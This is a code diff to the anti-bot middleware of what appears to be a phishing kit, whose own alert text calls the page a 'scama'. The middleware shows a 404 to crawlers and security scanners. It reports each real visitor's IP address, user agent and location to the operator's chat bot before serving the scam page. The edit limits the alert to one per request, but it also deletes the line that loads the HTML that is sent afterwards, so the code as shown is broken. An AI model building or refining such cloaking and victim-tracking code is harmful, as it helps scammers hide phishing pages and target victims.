@@ -250,7 +250,7 @@ async function antiBotMiddleware(req, res, next) {
     const clientUA = req.headers['user-agent'] || req.get('user-agent');
     const clientIP = getClientIp(req);
     const clientRef = req.headers.referer || req.headers.origin;
-
+    let messageSent = false;
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
         return res.status(404).send('Not Found');
     } else {
@@ -270,10 +270,13 @@ async function antiBotMiddleware(req, res, next) {
         try {
     
             message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
-    
-            const sendMessage = sendMessageFor(botToken, chatId); 
-            sendMessage(message);
-            const htmlContent = await fs.readFile('index.html', 'utf-8');
+                
+            if (!messageSent) {
+                // Only send the message if it hasn't been sent yet for this request
+                const sendMessage = sendMessageFor(botToken, chatId);
+                sendMessage(message);
+                messageSent = true;  // Update the flag
+            }
 
             // Send the HTML content as a response
             res.send(htmlContent);
